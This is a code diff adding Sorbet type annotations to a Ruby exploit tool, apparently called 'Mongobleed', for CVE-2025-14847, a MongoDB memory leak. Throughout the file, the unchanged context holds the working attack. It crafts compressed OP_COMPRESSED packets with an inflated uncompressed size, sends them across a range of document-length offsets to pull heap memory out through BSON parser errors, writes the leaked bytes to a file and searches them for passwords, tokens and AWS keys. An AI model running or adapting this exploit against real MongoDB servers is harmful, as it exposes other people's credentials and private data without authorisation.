@@ -1,4 +1,5 @@
 #!/usr/bin/env ruby
+# typed: strict
 # frozen_string_literal: true
 
 # ==============================================================================
@@ -46,8 +47,11 @@ require "zlib"
 require "optparse"
 require "set"
 require "colorize"
+require "sorbet-runtime"
 
 module CVE202514847
+  extend T::Sig
+
   class Error < StandardError; end
   class NetworkError < Error; end
   class DecompressionError < Error; end
@@ -55,6 +59,9 @@ module CVE202514847
   # MongoDB's OP_COMPRESSED supports snappy, zlib, and zstd.
   # Zlib (compressor_id=2) is used for universal compatibility.
   class Compressor
+    extend T::Sig
+
+    sig { params(data: String).returns(String) }
     def compress(data)
       Zlib::Deflate.deflate(data)
     end
@@ -62,16 +69,22 @@ module CVE202514847
 
   # Varying doc_len probes different heap offsets when combined with inflated buffer_size.
   class BSONBuilder
-    # Minimal valid BSON: type=0x10 (int32), field='a', null, value=1
-    BSON_CONTENT = "\x10a\x00\x01\x00\x00\x00"
+    extend T::Sig
 
+    # Minimal valid BSON: type=0x10 (int32), field='a', null, value=1
+    BSON_CONTENT = T.let("\x10a\x00\x01\x00\x00\x00", String)
+
+    sig { params(doc_len: Integer).returns(String) }
     def build(doc_len)
       [doc_len].pack("l<") + BSON_CONTENT.b
     end
   end
 
   class WireProtocolBuilder
+    extend T::Sig
+
     # OP_MSG format: flags (4 bytes) + kind (1 byte) + payload
+    sig { params(bson: String).returns(String) }
     def build_op_msg(bson)
       [0].pack("L<") + "\x00".b + bson
     end
@@ -79,6 +92,7 @@ module CVE202514847
     # OP_COMPRESSED format: original_opcode (2013=OP_MSG) + uncompressed_size + compressor_id (2=zlib) + data
     # The vulnerability: buffer_size (uncompressed_size) is trusted without validation,
     # causing BSON parser to read beyond actual decompressed data into heap memory.
+    sig { params(compressed_data: String, buffer_size: Integer).returns(String) }
     def build_op_compressed(compressed_data:, buffer_size:)
       [2013].pack("L<") +
         [buffer_size].pack("l<") +
@@ -88,10 +102,13 @@ module CVE202514847
   end
 
   class HeaderBuilder
-    HEADER_SIZE = 16
-    OPCODE_COMPRESSED = 2012
+    extend T::Sig
+
+    HEADER_SIZE = T.let(16, Integer)
+    OPCODE_COMPRESSED = T.let(2012, Integer)
 
     # Wire protocol header: length + requestID + responseID + opcode
+    sig { params(payload_size: Integer).returns(String) }
     def build(payload_size)
       [HEADER_SIZE + payload_size, 1, 0, OPCODE_COMPRESSED].pack("L<L<L<L<")
     end
@@ -99,6 +116,16 @@ module CVE202514847
 
   # Construction order: BSON → OP_MSG → compress → OP_COMPRESSED → header
   class PayloadBuilder
+    extend T::Sig
+
+    sig do
+      params(
+        bson_builder: BSONBuilder,
+        protocol_builder: WireProtocolBuilder,
+        compressor: Compressor,
+        header_builder: HeaderBuilder,
+      ).void
+    end
     def initialize(
       bson_builder:,
       protocol_builder:,
@@ -111,6 +138,7 @@ module CVE202514847
       @header_builder = header_builder
     end
 
+    sig { params(doc_len: Integer, buffer_size: Integer).returns(String) }
     def build(doc_len:, buffer_size:)
       bson = @bson_builder.build(doc_len)
       op_msg = @protocol_builder.build_op_msg(bson)
@@ -124,8 +152,11 @@ module CVE202514847
   end
 
   class SocketFactory
-    SOCKET_TIMEOUT = 2
+    extend T::Sig
 
+    SOCKET_TIMEOUT = T.let(2, Integer)
+
+    sig { params(host: String, port: Integer).returns(Socket) }
     def create(host:, port:)
       Socket.new(:INET, :STREAM).tap do |sock|
         sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [SOCKET_TIMEOUT, 0].pack("l_2"))
@@ -137,8 +168,11 @@ module CVE202514847
 
   # MongoDB uses length-prefixed framing: first 4 bytes specify total message length.
   class SocketReader
-    RECV_BUFFER_SIZE = 4096
+    extend T::Sig
 
+    RECV_BUFFER_SIZE = T.let(4096, Integer)
+
+    sig { params(socket: Socket).returns(String) }
     def read(socket)
       response = String.new(encoding: Encoding::BINARY)
 
@@ -156,6 +190,7 @@ module CVE202514847
 
     private
 
+    sig { params(response: String).returns(T::Boolean) }
     def response_complete?(response)
       return false if response.bytesize < 4
 
@@ -165,8 +200,15 @@ module CVE202514847
   end
 
   class NetworkClient
-    attr_reader :host, :port
+    extend T::Sig
 
+    sig { returns(String) }
+    attr_reader :host
+
+    sig { returns(Integer) }
+    attr_reader :port
+
+    sig { params(host: String, port: Integer, socket_factory: SocketFactory, socket_reader: SocketReader).void }
     def initialize(host:, port:, socket_factory:, socket_reader:)
       @host = host
       @port = port
@@ -174,6 +216,7 @@ module CVE202514847
       @socket_reader = socket_reader
     end
 
+    sig { params(payload: String).returns(String) }
     def send_and_receive(payload)
       socket = @socket_factory.create(host: host, port: port)
       socket.write(payload)
@@ -182,20 +225,25 @@ module CVE202514847
       response
     rescue SocketError, Errno::ECONNREFUSED, Errno::ETIMEDOUT => e
       raise NetworkError, "Failed to connect to #{host}:#{port} - #{e.message}"
-    rescue StandardError
+    rescue IOError, SystemCallError
+      # Return empty response if read/write operations fail
       String.new(encoding: Encoding::BINARY)
     end
   end
 
   # Leaked data surfaces in BSON parsing error messages after decompression.
   class ResponseDecompressor
-    MIN_RESPONSE_SIZE = 25 # 16-byte header + 9-byte OP_COMPRESSED envelope minimum
-    OPCODE_COMPRESSED = 2012
+    extend T::Sig
 
+    MIN_RESPONSE_SIZE = T.let(25, Integer) # 16-byte header + 9-byte OP_COMPRESSED envelope minimum
+    OPCODE_COMPRESSED = T.let(2012, Integer)
+
+    sig { params(response: String).void }
     def initialize(response)
       @response = response
     end
 
+    sig { returns(T.nilable(String)) }
     def decompress
       return if @response.bytesize < MIN_RESPONSE_SIZE
 
@@ -213,6 +261,7 @@ module CVE202514847
 
     private
 
+    sig { returns(T::Boolean) }
     def compressed?
       @response[12..15].unpack1("L<") == OPCODE_COMPRESSED
     end
@@ -221,14 +270,18 @@ module CVE202514847
   # When BSON parser reads beyond the buffer into heap memory, it generates errors
   # containing "field name 'X'" and "type N" where X and N are leaked heap data.
   class LeakParser
-    FIELD_NAME_PATTERN = /field name '([^']*)'/
-    TYPE_PATTERN = /type (\d+)/
-    IGNORED_FIELDS = ["?", "a", "$db", "ping"].freeze # Filter out our probe payload
+    extend T::Sig
 
+    FIELD_NAME_PATTERN = T.let(/field name '([^']*)'/, Regexp)
+    TYPE_PATTERN = T.let(/type (\d+)/, Regexp)
+    IGNORED_FIELDS = T.let(["?", "a", "$db", "ping"].freeze, T::Array[String]) # Filter out our probe payload
+
+    sig { params(raw_data: T.nilable(String)).void }
     def initialize(raw_data)
       @raw_data = raw_data
     end
 
+    sig { returns(T::Array[String]) }
     def parse
       return [] if @raw_data.nil?
 
@@ -237,58 +290,75 @@ module CVE202514847
 
     private
 
+    sig { returns(T::Array[String]) }
     def extract_field_names
-      @raw_data.scan(FIELD_NAME_PATTERN).flatten.reject do |data|
+      T.must(@raw_data).scan(FIELD_NAME_PATTERN).flatten.reject do |data|
         data.empty? || IGNORED_FIELDS.include?(data)
       end
     end
 
+    sig { returns(T::Array[String]) }
     def extract_type_bytes
-      @raw_data.scan(TYPE_PATTERN).map do |match|
+      T.must(@raw_data).scan(TYPE_PATTERN).map do |match|
         [match.first.to_i & 0xFF].pack("C")
       end
     end
   end
 
   class ScanResults
-    attr_reader :all_leaked, :unique_leaks
+    extend T::Sig
 
+    sig { returns(String) }
+    attr_reader :all_leaked
+
+    sig { returns(T::Set[String]) }
+    attr_reader :unique_leaks
+
+    sig { void }
     def initialize
-      @all_leaked = String.new(encoding: Encoding::BINARY)
-      @unique_leaks = Set.new
+      @all_leaked = T.let(String.new(encoding: Encoding::BINARY), String)
+      @unique_leaks = T.let(Set.new, T::Set[String])
     end
 
+    sig { params(data: String).void }
     def add(data)
       unique_leaks.add(data)
       all_leaked << data
     end
 
+    sig { params(data: String).returns(T::Boolean) }
     def seen?(data)
       unique_leaks.include?(data)
     end
 
+    sig { returns(Integer) }
     def total_bytes
       all_leaked.bytesize
     end
 
+    sig { returns(Integer) }
     def unique_count
       unique_leaks.size
     end
   end
 
   class OutputFormatter
-    MIN_DISPLAY_SIZE = 10
-    PREVIEW_LENGTH = 80
+    extend T::Sig
 
+    MIN_DISPLAY_SIZE = T.let(10, Integer)
+    PREVIEW_LENGTH = T.let(80, Integer)
+
+    sig { void }
     def print_banner
       puts
-      puts ("=" * 60).to_s.cyan
+      puts ("=" * 60).cyan
       puts "  Mongobleed - CVE-2025-14847 MongoDB Memory Leak".bold
       puts "  Author: Demetrius Ford - github.com/demetriusford".light_black
-      puts ("=" * 60).to_s.cyan
+      puts ("=" * 60).cyan
       puts
     end
 
+    sig { params(host: String, port: Integer, min_offset: Integer, max_offset: Integer).void }
     def print_header(host:, port:, min_offset:, max_offset:)
       print_banner
       puts "#{"[*]".blue} Target: #{"#{host}:#{port}".bold}"
@@ -297,6 +367,7 @@ module CVE202514847
       puts
     end
 
+    sig { params(data: String, offset: Integer).void }
     def print_leak(data:, offset:)
       return if data.bytesize <= MIN_DISPLAY_SIZE
 
@@ -309,9 +380,10 @@ module CVE202514847
       puts "#{"[+]".green} Offset #{offset_str} | Size: #{size_str} | #{preview}"
     end
 
+    sig { params(total_bytes: Integer, unique_count: Integer, output_path: String).void }
     def print_summary(total_bytes:, unique_count:, output_path:)
       puts
-      puts ("=" * 60).to_s.cyan
+      puts ("=" * 60).cyan
       puts "#{"[*]".blue} Scan complete!"
       puts
       puts "#{"[*]".blue} Total leaked data: #{"#{total_bytes} bytes".green}"
@@ -319,39 +391,50 @@ module CVE202514847
       puts "#{"[*]".blue} Output saved to: #{output_path.bold}"
     end
 
+    sig { params(pattern: String).void }
     def print_secret_found(pattern)
       puts "#{"[!]".yellow} Potential secret detected: #{pattern.upcase.red}"
     end
 
+    sig { void }
     def print_secrets_header
       puts
-      puts ("-" * 60).to_s.yellow
+      puts ("-" * 60).yellow
       puts "#{"[!]".yellow} Scanning for sensitive patterns..."
-      puts ("-" * 60).to_s.yellow
+      puts ("-" * 60).yellow
     end
 
+    sig { void }
     def print_no_secrets
       puts "#{"[*]".blue} No obvious secrets detected in leaked data"
     end
 
+    sig { void }
     def print_secrets_footer
-      puts ("-" * 60).to_s.yellow
+      puts ("-" * 60).yellow
     end
   end
 
   class FileWriter
+    extend T::Sig
+
+    sig { params(path: String, data: String).void }
     def write(path:, data:)
       File.binwrite(path, data)
     end
   end
 
   class SecretDetector
-    SECRET_PATTERNS = ["password", "secret", "key", "token", "admin", "AKIA"].freeze # AKIA = AWS access keys
+    extend T::Sig
 
+    SECRET_PATTERNS = T.let(["password", "secret", "key", "token", "admin", "AKIA"].freeze, T::Array[String]) # AKIA = AWS access keys
+
+    sig { params(data: String).void }
     def initialize(data)
       @data = data
     end
 
+    sig { returns(T::Array[String]) }
     def detect
       downcase_data = @data.downcase
 
@@ -362,11 +445,15 @@ module CVE202514847
   end
 
   class MemoryProbe
+    extend T::Sig
+
+    sig { params(network_client: NetworkClient, payload_builder: PayloadBuilder).void }
     def initialize(network_client:, payload_builder:)
       @network_client = network_client
       @payload_builder = payload_builder
     end
 
+    sig { params(doc_len: Integer, buffer_size: Integer).returns(String) }
     def send_probe(doc_len:, buffer_size:)
       payload = @payload_builder.build(doc_len: doc_len, buffer_size: buffer_size)
       @network_client.send_and_receive(payload)
@@ -374,15 +461,20 @@ module CVE202514847
   end
 
   class LeakExtractor
+    extend T::Sig
+
+    sig { params(decompressor: T.class_of(ResponseDecompressor), parser: T.class_of(LeakParser)).void }
     def initialize(decompressor:, parser:)
       @decompressor = decompressor
       @parser = parser
     end
 
+    sig { params(response: String).returns(T::Array[String]) }
     def extract(response)
       raw_data = @decompressor.new(response).decompress
       @parser.new(raw_data).parse
-    rescue StandardError
+    rescue DecompressionError, Zlib::Error, Encoding::InvalidByteSequenceError
+      # Return empty array if decompression or parsing fails
       []
     end
   end
@@ -390,8 +482,11 @@ module CVE202514847
   # Each doc_len probes a different heap offset. The 500-byte overflow causes
   # BSON parser to read beyond the actual decompressed data into heap memory.
   class OffsetScanner
-    BUFFER_SIZE_OFFSET = 500 # Claim buffer is 500 bytes larger than actual
+    extend T::Sig
 
+    BUFFER_SIZE_OFFSET = T.let(500, Integer) # Claim buffer is 500 bytes larger than actual
+
+    sig { params(min_offset: Integer, max_offset: Integer, memory_probe: MemoryProbe, leak_extractor: LeakExtractor).void }
     def initialize(min_offset:, max_offset:, memory_probe:, leak_extractor:)
       @min_offset = min_offset
       @max_offset = max_offset
@@ -399,7 +494,8 @@ module CVE202514847
       @leak_extractor = leak_extractor
     end
 
-    def each_leak
+    sig { params(_blk: T.proc.params(leak_data: String, offset: Integer).void).void }
+    def each_leak(&_blk)
       (@min_offset...@max_offset).each do |doc_len|
         response = @memory_probe.send_probe(
           doc_len: doc_len,
@@ -415,6 +511,18 @@ module CVE202514847
   end
 
   class ExploitRunner
+    extend T::Sig
+
+    sig do
+      params(
+        offset_scanner: OffsetScanner,
+        results: ScanResults,
+        output_formatter: OutputFormatter,
+        file_writer: FileWriter,
+        secret_detector_class: T.class_of(SecretDetector),
+        output_path: String,
+      ).void
+    end
     def initialize(
       offset_scanner:,
       results:,
@@ -431,6 +539,7 @@ module CVE202514847
       @output_path = output_path
     end
 
+    sig { void }
     def execute
       collect_leaks
       save_results
@@ -440,6 +549,7 @@ module CVE202514847
 
     private
 
+    sig { void }
     def collect_leaks
       @offset_scanner.each_leak do |leak_data, offset|
         next if @results.seen?(leak_data)
@@ -449,10 +559,12 @@ module CVE202514847
       end
     end
 
+    sig { void }
     def save_results
       @file_writer.write(path: @output_path, data: @results.all_leaked)
     end
 
+    sig { void }
     def print_summary
       @output_formatter.print_summary(
         total_bytes: @results.total_bytes,
@@ -461,6 +573,7 @@ module CVE202514847
       )
     end
 
+    sig { void }
     def detect_and_print_secrets
       detector = @secret_detector_class.new(@results.all_leaked)
       detected_secrets = detector.detect
@@ -478,14 +591,22 @@ module CVE202514847
   end
 
   class OptionsParser
-    DEFAULT_OPTIONS = {
-      host: "localhost",
-      port: 27017,
-      min_offset: 20,
-      max_offset: 8192,
-      output: "leaked.bin",
-    }.freeze
+    extend T::Sig
 
+    OptionsHash = T.type_alias { T::Hash[Symbol, T.any(String, Integer)] }
+
+    DEFAULT_OPTIONS = T.let(
+      {
+        host: "localhost",
+        port: 27017,
+        min_offset: 20,
+        max_offset: 8192,
+        output: "leaked.bin",
+      }.freeze,
+      T::Hash[Symbol, T.any(String, Integer)],
+    )
+
+    sig { params(args: T::Array[String]).returns(OptionsHash) }
     def parse(args = ARGV)
       options = DEFAULT_OPTIONS.dup
 
@@ -523,11 +644,15 @@ module CVE202514847
   end
 
   class Scanner
+    extend T::Sig
+
+    sig { params(options: OptionsParser::OptionsHash).void }
     def initialize(options)
       @options = options
-      @output_formatter = OutputFormatter.new
+      @output_formatter = T.let(OutputFormatter.new, OutputFormatter)
     end
 
+    sig { void }
     def run
       print_header
       workflow = build_workflow
@@ -539,15 +664,17 @@ module CVE202514847
 
     private
 
+    sig { void }
     def print_header
       @output_formatter.print_header(
-        host: @options[:host],
-        port: @options[:port],
-        min_offset: @options[:min_offset],
-        max_offset: @options[:max_offset],
+        host: T.cast(@options[:host], String),
+        port: T.cast(@options[:port], Integer),
+        min_offset: T.cast(@options[:min_offset], Integer),
+        max_offset: T.cast(@options[:max_offset], Integer),
       )
     end
 
+    sig { returns(ExploitRunner) }
     def build_workflow
       ExploitRunner.new(
         offset_scanner: build_offset_scanner,
@@ -555,19 +682,21 @@ module CVE202514847
         output_formatter: @output_formatter,
         file_writer: FileWriter.new,
         secret_detector_class: SecretDetector,
-        output_path: @options[:output],
+        output_path: T.cast(@options[:output], String),
       )
     end
 
+    sig { returns(OffsetScanner) }
     def build_offset_scanner
       OffsetScanner.new(
-        min_offset: @options[:min_offset],
-        max_offset: @options[:max_offset],
+        min_offset: T.cast(@options[:min_offset], Integer),
+        max_offset: T.cast(@options[:max_offset], Integer),
         memory_probe: build_memory_probe,
         leak_extractor: build_leak_extractor,
       )
     end
 
+    sig { returns(MemoryProbe) }
     def build_memory_probe
       MemoryProbe.new(
         network_client: build_network_client,
@@ -575,15 +704,17 @@ module CVE202514847
       )
     end
 
+    sig { returns(NetworkClient) }
     def build_network_client
       NetworkClient.new(
-        host: @options[:host],
-        port: @options[:port],
+        host: T.cast(@options[:host], String),
+        port: T.cast(@options[:port], Integer),
         socket_factory: SocketFactory.new,
         socket_reader: SocketReader.new,
       )
     end
 
+    sig { returns(PayloadBuilder) }
     def build_payload_builder
       PayloadBuilder.new(
         bson_builder: BSONBuilder.new,
@@ -593,6 +724,7 @@ module CVE202514847
       )
     end
 
+    sig { returns(LeakExtractor) }
     def build_leak_extractor
       LeakExtractor.new(
         decompressor: ResponseDecompressor,
@@ -602,12 +734,18 @@ module CVE202514847
   end
 
   class CLI
+    extend T::Sig
+
     class << self
+      extend T::Sig
+
+      sig { void }
       def run
         new.run
       end
     end
 
+    sig { void }
     def run
       options = OptionsParser.new.parse
       Scanner.new(options).run
